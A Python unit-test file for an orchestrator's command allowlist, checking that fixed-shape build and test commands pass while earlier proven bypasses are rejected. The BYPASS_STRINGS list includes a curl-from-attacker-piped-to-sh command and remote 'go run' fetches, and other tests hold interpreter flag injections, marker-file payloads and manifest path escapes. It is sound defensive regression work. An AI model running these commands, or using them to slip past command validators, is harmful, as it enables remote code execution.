"""Unit tests for the criterion/gate-validation command allowlist.

Regression coverage for the RCE hardening. Three prior rounds of a
denylist-of-dangerous-flags design were each defeated by a new bypass class;
this suite locks in the fixed-shape allowlist that replaced it, including
every bypass string proven live against the earlier designs.
"""

from __future__ import annotations

import json
import re
from pathlib import Path

import pytest

from orchestrator.criterion import confined_to_repo, is_executable_command, run_check_command
from orchestrator.process import ProcessResult


def _parse_go_mod_replaces_for_test(text: str) -> list[dict]:
    """Test-only stand-in for what `go mod edit -json` would report for the
    simple go.mod fixtures below — mirrors go.mod's quoting rules (a single
    matching pair of `"..."` or backticks around a target is stripped) and
    the module-vs-filesystem distinction (a `path version` pair is a module
    replace; anything else is a filesystem path)."""
    replaces = []
    for line in text.splitlines():
        line = line.split("//", 1)[0].strip()  # real go.mod parsing ignores // comments
        if "=>" not in line:
            continue
        target = line.split("=>", 1)[1].strip()
        if len(target) >= 2 and target[0] == target[-1] and target[0] in ('"', "`"):
            target = target[1:-1]
        parts = target.split()
        if len(parts) == 2 and re.match(r"^v[0-9]", parts[1]):
            replaces.append({"New": {"Path": parts[0], "Version": parts[1]}})
        else:
            replaces.append({"New": {"Path": target, "Version": ""}})
    return replaces


def _install_fake_go_mod_edit_json(monkeypatch: pytest.MonkeyPatch) -> None:
    """Patch criterion.run_process so `_go_manifest_confined` can be tested
    without a real `go` binary (none installed in this sandbox) — this tests
    our own JSON-consumption and containment logic, not go's own parser."""

    async def fake_run_process(argv, cwd, timeout_s=None, **kwargs):
        go_mod = Path(cwd) / "go.mod"
        replaces = _parse_go_mod_replaces_for_test(go_mod.read_text())
        payload = json.dumps({"Replace": replaces})
        return ProcessResult(exit_code=0, timed_out=False, cancelled=False, duration_s=0.0, stdout_tail=[payload])

    monkeypatch.setattr("orchestrator.criterion.run_process", fake_run_process)


def test_plain_allowlisted_command_passes():
    ok, command = is_executable_command("npm run test")
    assert ok is True
    assert command == "npm run test"


def test_disallowed_first_word_rejected():
    ok, _ = is_executable_command("bash -c 'echo hi'")
    assert ok is False


def test_python_inline_code_flag_rejected():
    ok, _ = is_executable_command("python3 -c \"import os; os.system('id')\"")
    assert ok is False


def test_node_eval_flag_rejected():
    ok, _ = is_executable_command("node -e \"require('child_process').execSync('id')\"")
    assert ok is False


def test_node_print_flag_rejected():
    ok, _ = is_executable_command('node --print "1+1"')
    assert ok is False


def test_node_running_a_script_file_passes():
    ok, command = is_executable_command("node checks/whitespace-probe.js")
    assert ok is True
    assert command == "node checks/whitespace-probe.js"


def test_blocked_token_exact_match_rejected():
    ok, _ = is_executable_command("npm run rm")
    # "rm" is a whole argv token here (npm passes it as the script name), so
    # this is intentionally rejected — but a false-positive substring match
    # (e.g. a script named "confirm") must NOT be rejected, checked below.
    assert ok is False


def test_blocked_token_is_word_boundary_not_substring():
    # Regression: an old substring-based denylist rejected any command
    # merely containing "git" as a substring anywhere in the text.
    ok, command = is_executable_command("npm run configure-git-hooks")
    assert ok is True
    assert command == "npm run configure-git-hooks"


def test_npm_publish_rejected():
    # "publish" is not a recognized npm shape at all (test/ci/install/run
    # <script> only) — rejected by the closed shape set, no denylist needed.
    ok, _ = is_executable_command("npm publish --access public")
    assert ok is False


def test_git_as_first_word_still_rejected():
    ok, _ = is_executable_command("git push origin main")
    assert ok is False


def test_npm_run_script_name_must_be_a_bare_identifier():
    ok, command = is_executable_command("npm run check-fail")
    assert ok is True
    assert command == "npm run check-fail"


# Every string below was verified (by direct invocation) to bypass the
# earlier flag-denylist design and reach real execution via the plan/gate
# validation path, across three separate rounds of that design. The
# fixed-shape allowlist rejects all of them structurally (wrong token count,
# wrong subcommand adjacency, or a path argument that fails the traversal/
# absolute-path check) rather than by naming each dangerous flag.
BYPASS_STRINGS = [
    # Round 2
    'uv run bash -c "curl attacker/x|sh"',
    'uv run python3 -c "import os;os.system(1)"',
    'npx -c "id"',
    'npm exec -c "id"',
    "pnpm dlx cowsay hi",
    'pnpm exec bash -c "id"',
    "yarn dlx cowsay hi",
    "go run github.com/attacker/evil@latest",
    "make -f /tmp/evil.mk",
    # Round 3 — flag-before-subcommand, flag-after-subcommand-before-target,
    # attached short options, remote/absolute/traversal targets, loader-hook
    # injection, unguarded `-m pip`.
    'uv --directory . run bash -c "curl attacker/x|sh"',
    'uv run -- bash -c "id"',
    'uv run --with anything bash -c "id"',
    "go -C . run github.com/attacker/evil@latest",
    "cargo +nightly run",
    "cargo run --manifest-path /tmp/evil/Cargo.toml",
    "go run ../../../../tmp/evil",
    "uv run /tmp/evil.py",
    "make -fMakefile.evil",
    "make -C/tmp",
    'node --experimental-loader "data:text/javascript,evil" x.js',
    "python3 -m pip install anything",
    # Round 4 — attached-flag tokens that end in a recognized extension
    # (`.py`/`.js`) sliding past the extension check into the "run this
    # script" shape, while the real interpreter parses the same token as a
    # flag with independent code-execution effects (python -m's dotted
    # module import runs `__init__.py`; node's --require/--loader preload
    # runs before Node even looks for a main script).
    "python3 -mpy.py",
    "python -mpy.py",
    "uv run python3 -mpkg.py",
    "node --require=./x.js",
    "node -r./x.js",
    "node --loader=./x.mjs",
    "uv run node --require=./x.js",
]


def test_previously_verified_bypasses_are_now_rejected():
    for command in BYPASS_STRINGS:
        ok, _ = is_executable_command(command)
        assert ok is False, f"expected rejection, allowlist still permits: {command!r}"


LEGITIMATE_COMMANDS = [
    "uv run pytest",
    "uv run python3 checks/probe.py",
    "pytest -k test_foo",
    "pytest -m slow tests/test_x.py",
    "npm test",
    "npm ci",
    "npm install",
    "npm run build",
    "go test ./...",
    "go test ./cmd/server",
    "go build ./...",
    "go run ./cmd/server",
    "go run .",
    "make lint",
    "cargo test",
    "cargo build --release",
    "python3 checks/probe.py",
    "python3 -m pytest",
    "python -m unittest",
]


def test_legitimate_commands_still_pass():
    for command in LEGITIMATE_COMMANDS:
        ok, returned = is_executable_command(command)
        assert ok is True, f"expected allow, fix over-rejected: {command!r}"
        assert returned == command


# -- adversarial shapes beyond the previously-proven bypass strings --------


def test_flag_before_recognized_subcommand_rejected():
    for command in [
        "go -v test ./...",
        "cargo -v test",
        "uv -v run pytest",
    ]:
        ok, _ = is_executable_command(command)
        assert ok is False, command


def test_extra_trailing_tokens_rejected_not_prefix_matched():
    # No shell is ever invoked (argv array via execvp), so `&&`/`rm`/`-rf`/`/`
    # are just inert extra shlex tokens — but the shape matcher must reject
    # them outright rather than accept a valid prefix and ignore the rest.
    ok, _ = is_executable_command("make target && rm -rf /")
    assert ok is False
    ok, _ = is_executable_command("npm test extra-arg")
    assert ok is False
    ok, _ = is_executable_command("pytest tests/ && echo pwned")
    assert ok is False


def test_python_dash_m_rejects_unlisted_modules():
    ok, _ = is_executable_command("python3 -m http.server")
    assert ok is False
    ok, _ = is_executable_command("python -m pip")
    assert ok is False


def test_absolute_path_target_rejected_for_every_path_shape():
    for command in [
        "node /tmp/evil.js",
        "python3 /tmp/evil.py",
        "pytest /tmp/evil",
        "go test /tmp/evil",
        "uv run node /tmp/evil.js",
    ]:
        ok, _ = is_executable_command(command)
        assert ok is False, command


def test_traversal_target_rejected_for_every_path_shape():
    for command in [
        "node ../evil.js",
        "python3 ../../evil.py",
        "pytest ../../../etc",
        "go test ../evil",
        "go build ../../evil",
    ]:
        ok, _ = is_executable_command(command)
        assert ok is False, command


def test_uv_run_cannot_nest_another_uv_run():
    ok, _ = is_executable_command("uv run uv run pytest")
    assert ok is False


def test_uv_run_bare_path_rejected():
    # No shape allows a bare path as argv[0] — closes "uv run <script>"
    # (script executed directly, no interpreter) as an escape route.
    ok, _ = is_executable_command("uv run script.py")
    assert ok is False


# -- confined_to_repo: real-filesystem containment, including symlinks -----


async def test_confined_to_repo_accepts_in_repo_path(tmp_path: Path):
    (tmp_path / "checks").mkdir()
    (tmp_path / "checks" / "probe.js").write_text("")
    assert await confined_to_repo("node checks/probe.js", tmp_path) is True


async def test_confined_to_repo_rejects_symlink_escaping_repo(tmp_path: Path):
    outside = tmp_path.parent / "outside_evil.js"
    outside.write_text("")
    try:
        link = tmp_path / "escape.js"
        link.symlink_to(outside)
        assert await confined_to_repo("node escape.js", tmp_path) is False
    finally:
        outside.unlink(missing_ok=True)


async def test_confined_to_repo_rejects_command_that_fails_shape_match():
    assert await confined_to_repo("bash -c 'id'", Path(".")) is False


@pytest.mark.parametrize("target", ["./...", "."])
async def test_confined_to_repo_handles_go_special_targets(tmp_path: Path, target: str):
    # No go.mod present — _go_manifest_confined short-circuits before ever
    # calling run_process, so no fake/mock is needed for this one.
    assert await confined_to_repo(f"go test {target}", tmp_path) is True


# -- end-to-end proof for the two live RCEs proven against round 4 ---------
#
# Both bypasses were only visible through the real `run_check_command`
# production path: the shape-matcher unit check alone doesn't demonstrate
# that the flag would actually have been interpreted as code-execution by
# the real interpreter. These reproduce the proof-of-concept payloads and
# assert (a) is_executable_command already rejects the string outright, and
# (b) run_check_command refuses to execute it at all — no marker file from
# the payload is ever created.


async def test_python_dash_m_attached_flag_never_executes(tmp_path: Path):
    payload_pkg = tmp_path / "py"
    payload_pkg.mkdir()
    marker = tmp_path / "pwned.txt"
    (payload_pkg / "__init__.py").write_text(f"open({marker!r}, 'w').write('MALICIOUS __init__.py EXECUTED')\n")

    command = "python3 -mpy.py"
    ok, _ = is_executable_command(command)
    assert ok is False

    exit_code, tail = await run_check_command(tmp_path, command)
    assert exit_code is None
    assert "resolves outside" in tail or "path argument" in tail
    assert not marker.exists(), "payload executed despite rejection"


# -- manifest-driven repo-confinement escape (go.mod replace / Cargo.toml
# [patch]/path deps / package.json file:|link: deps) — defense in depth on
# top of the argv path check, since these let the toolchain read/execute
# content outside the repo the argv path was already confined to, via
# manifest content rather than argv. Parsed with real parsers (go mod edit
# -json / tomllib / json.loads), never regex — a regex-based first attempt
# at this check was itself bypassed via single-quoted TOML strings, a bare
# Cargo path containing "..", and quoted go.mod replace targets (see the
# quoted/backtick and single-quote/bare-path tests below). --


async def test_go_mod_replace_escaping_repo_rejected(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    _install_fake_go_mod_edit_json(monkeypatch)
    (tmp_path / "go.mod").write_text("module example.com/x\n\nreplace example.com/x => ../../../../tmp/evil\n")
    assert await confined_to_repo("go test ./...", tmp_path) is False
    assert await confined_to_repo("go build ./...", tmp_path) is False
    assert await confined_to_repo("go run .", tmp_path) is False


async def test_go_mod_replace_absolute_path_escaping_repo_rejected(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    _install_fake_go_mod_edit_json(monkeypatch)
    (tmp_path / "go.mod").write_text("module example.com/x\n\nreplace example.com/x => /etc\n")
    assert await confined_to_repo("go test ./...", tmp_path) is False


async def test_go_mod_replace_block_form_escaping_repo_rejected(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    _install_fake_go_mod_edit_json(monkeypatch)
    (tmp_path / "go.mod").write_text("module example.com/x\n\nreplace (\n\texample.com/x => ../../outside\n)\n")
    assert await confined_to_repo("go test ./...", tmp_path) is False


async def test_go_mod_replace_quoted_target_escaping_repo_rejected(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    # go.mod's grammar treats quoted and unquoted replace targets as
    # identical — "identifiers and strings are interchangeable." A naive
    # regex that captured the quote characters as part of the token treated
    # this as a harmless bare module reference instead of a path escape.
    _install_fake_go_mod_edit_json(monkeypatch)
    (tmp_path / "go.mod").write_text('module example.com/x\n\nreplace example.com/x => "../../../../tmp/evil"\n')
    assert await confined_to_repo("go test ./...", tmp_path) is False


async def test_go_mod_replace_backtick_quoted_absolute_target_rejected(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    _install_fake_go_mod_edit_json(monkeypatch)
    (tmp_path / "go.mod").write_text("module example.com/x\n\nreplace example.com/x => `/etc/evil`\n")
    assert await confined_to_repo("go test ./...", tmp_path) is False


async def test_go_mod_replace_in_repo_path_still_allowed(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    _install_fake_go_mod_edit_json(monkeypatch)
    (tmp_path / "internal" / "foo").mkdir(parents=True)
    (tmp_path / "go.mod").write_text("module example.com/x\n\nreplace example.com/foo => ./internal/foo\n")
    assert await confined_to_repo("go test ./...", tmp_path) is True


async def test_go_mod_replace_module_version_target_not_a_path_escape(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    _install_fake_go_mod_edit_json(monkeypatch)
    (tmp_path / "go.mod").write_text("module example.com/x\n\nreplace example.com/foo => example.com/bar v1.2.3\n")
    assert await confined_to_repo("go test ./...", tmp_path) is True


async def test_go_mod_comment_only_replace_mention_not_a_false_positive(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
):
    # A real parser (go mod edit -json) never sees comment text at all, so a
    # historical/example "replace" mentioned only in a // comment can't
    # trigger a false-positive rejection the way the earlier regex-scan
    # design's raw-text scan could have.
    _install_fake_go_mod_edit_json(monkeypatch)
    (tmp_path / "go.mod").write_text("module example.com/x\n\n// historically: replace example.com/x => ../outside\n")
    assert await confined_to_repo("go test ./...", tmp_path) is True


async def test_go_test_with_no_go_mod_is_unaffected(tmp_path: Path):
    # No go.mod present — _go_manifest_confined short-circuits before ever
    # calling run_process, so no fake/mock is needed for this one.
    assert await confined_to_repo("go test ./...", tmp_path) is True


async def test_go_mod_edit_json_failure_fails_closed(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    async def failing_run_process(argv, cwd, timeout_s=None, **kwargs):
        return ProcessResult(exit_code=1, timed_out=False, cancelled=False, duration_s=0.0, stderr_tail=["no go.mod"])

    monkeypatch.setattr("orchestrator.criterion.run_process", failing_run_process)
    (tmp_path / "go.mod").write_text("module example.com/x\n")
    assert await confined_to_repo("go test ./...", tmp_path) is False


async def test_cargo_patch_escaping_repo_rejected(tmp_path: Path):
    (tmp_path / "Cargo.toml").write_text(
        '[package]\nname = "x"\n\n[patch.crates-io]\nfoo = { path = "../../../../tmp/evil" }\n'
    )
    assert await confined_to_repo("cargo test", tmp_path) is False
    assert await confined_to_repo("cargo build", tmp_path) is False


async def test_cargo_path_dependency_escaping_repo_rejected(tmp_path: Path):
    (tmp_path / "Cargo.toml").write_text('[dependencies]\nfoo = { path = "/etc/evil" }\n')
    assert await confined_to_repo("cargo test", tmp_path) is False


async def test_cargo_path_dependency_single_quoted_escaping_repo_rejected(tmp_path: Path):
    # TOML literal strings (single-quoted) are just as valid as basic
    # (double-quoted) strings — a regex matching only `"..."` missed this.
    (tmp_path / "Cargo.toml").write_text("[dependencies]\nfoo = { path = '../../../../tmp/evil' }\n")
    assert await confined_to_repo("cargo test", tmp_path) is False


async def test_cargo_path_dependency_bare_with_traversal_rejected(tmp_path: Path):
    # Every Cargo `path=` value is always a filesystem path — there's no
    # "bare module reference" concept to exempt it from the traversal check
    # the way go.mod's bare module paths legitimately are.
    (tmp_path / "Cargo.toml").write_text('[dependencies]\nfoo = { path = "sub/../../../../tmp/evil" }\n')
    assert await confined_to_repo("cargo build", tmp_path) is False


async def test_cargo_path_dependency_in_repo_still_allowed(tmp_path: Path):
    (tmp_path / "crates" / "foo").mkdir(parents=True)
    (tmp_path / "Cargo.toml").write_text('[dependencies]\nfoo = { path = "crates/foo" }\n')
    assert await confined_to_repo("cargo test", tmp_path) is True


async def test_cargo_toml_malformed_fails_closed(tmp_path: Path):
    (tmp_path / "Cargo.toml").write_text("this is not [ valid toml")
    assert await confined_to_repo("cargo test", tmp_path) is False


async def test_node_require_attached_flag_never_executes(tmp_path: Path):
    marker = tmp_path / "pwned.txt"
    (tmp_path / "py.js").write_text(f"require('fs').writeFileSync({marker.as_posix()!r}, 'MALICIOUS py.js EXECUTED')\n")

    command = "node --require=./py.js"
    ok, _ = is_executable_command(command)
    assert ok is False

    exit_code, tail = await run_check_command(tmp_path, command)
    assert exit_code is None
    assert "resolves outside" in tail or "path argument" in tail
    assert not marker.exists(), "payload executed despite rejection"


# -- package.json file:/link: dependency escape (npm install/ci/run all
# share this indirection — a postinstall script in such a package runs
# during `npm install`, outside the repo the argv path was confined to). --


async def test_npm_file_dependency_escaping_repo_rejected(tmp_path: Path):
    manifest = {"name": "x", "dependencies": {"evil-pkg": "file:../outside/evil-pkg"}}
    (tmp_path / "package.json").write_text(json.dumps(manifest))
    assert await confined_to_repo("npm install", tmp_path) is False
    assert await confined_to_repo("npm ci", tmp_path) is False


async def test_npm_link_dev_dependency_escaping_repo_rejected(tmp_path: Path):
    manifest = {"name": "x", "devDependencies": {"evil-pkg": "link:/tmp/evil-pkg"}}
    (tmp_path / "package.json").write_text(json.dumps(manifest))
    assert await confined_to_repo("npm test", tmp_path) is False


async def test_npm_file_dependency_in_repo_still_allowed(tmp_path: Path):
    (tmp_path / "local-pkg").mkdir()
    manifest = {"name": "x", "dependencies": {"local-pkg": "file:./local-pkg"}}
    (tmp_path / "package.json").write_text(json.dumps(manifest))
    assert await confined_to_repo("npm install", tmp_path) is True


async def test_npm_no_package_json_is_unaffected(tmp_path: Path):
    assert await confined_to_repo("npm test", tmp_path) is True


async def test_npm_malformed_package_json_fails_closed(tmp_path: Path):
    (tmp_path / "package.json").write_text("{not valid json")
    assert await confined_to_repo("npm test", tmp_path) is False
